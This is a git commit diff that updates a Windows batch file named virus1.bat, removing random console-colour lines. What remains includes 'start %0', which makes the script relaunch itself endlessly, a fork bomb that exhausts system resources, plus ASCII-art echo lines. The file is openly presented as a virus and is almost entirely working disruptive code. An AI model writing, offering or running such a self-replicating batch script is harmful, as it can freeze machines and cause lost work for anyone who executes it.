d2e018071af0d4ff3512c1d35af386229ea9200f
MelloMantra <67211433+MelloMantra@users.noreply.github.com>
2021-11-17 08:50:38 -0700

    Update virus1.bat

--- virus1.bat
+++ virus1.bat
@@ -1,10 +1,5 @@
 @echo off
 start %0
-set /a rand1=%random% %% 16
-set /a rand2=%random% %% 16
-set HEX=0123456789ABCDEF
-call set hexcolors=%%HEX:~%rand1%,1%%%%HEX:~%rand2%,1%%
-color %hexcolors%
 echo.
 echo.
 echo     ###                     ######            ###
